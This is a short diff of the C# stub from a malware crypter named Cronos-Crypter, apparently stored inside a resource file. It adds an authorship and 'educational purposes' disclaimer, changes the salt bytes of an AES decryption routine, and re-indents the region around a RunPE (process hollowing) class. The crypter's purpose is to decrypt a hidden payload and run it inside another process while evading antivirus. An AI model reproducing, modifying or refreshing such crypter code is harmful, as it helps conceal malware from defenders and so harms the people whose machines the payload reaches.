@@ -154,6 +154,14 @@ using System.Windows.Forms;
 
 namespace Stub
 {
+    /// &lt;summary&gt;
+    /// Due to the theft of full repository and authors changes I add this note
+    /// I remind you that, this program is working on MIT License, so you can use, modify this program etc. but please leave credits to original authors.
+    /// Original Authors are Ajajjajk (Aries52) and XaFF
+    /// 
+    /// https://github.com/TalosSec/Cronos-Crypter
+    /// This program is written for educational purposes and We, Authors, do not take responsibility for and damages caused by this software!
+    /// &lt;/summary&gt;
     static class Stub
     {
         /// &lt;summary&gt;
@@ -225,7 +233,7 @@ namespace Stub
         public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, string decKey)
         {
             byte[] decryptedBytes = null;
-            byte[] saltBytes = new byte[] { 026, 020, 202, 234, 136, 123, 069, 047 };
+            byte[] saltBytes = new byte[] { 054, 022, 153, 017 , 088, 055, 112, 212 };
             using (MemoryStream ms = new MemoryStream())
             {
                 using (RijndaelManaged AES = new RijndaelManaged())
@@ -428,7 +436,7 @@ namespace Stub
 
 #endif
     }
-#region RunPE Class
+    #region RunPE Class
     public static class RunPE
     {
         //github.com/Artiist/RunPE-Process-Protection/blob/master/RunPE.cs
@@ -624,7 +632,7 @@ namespace Stub
         }
     }
 
-#endregion
+    #endregion
 }</value>
   </data>
 </root>
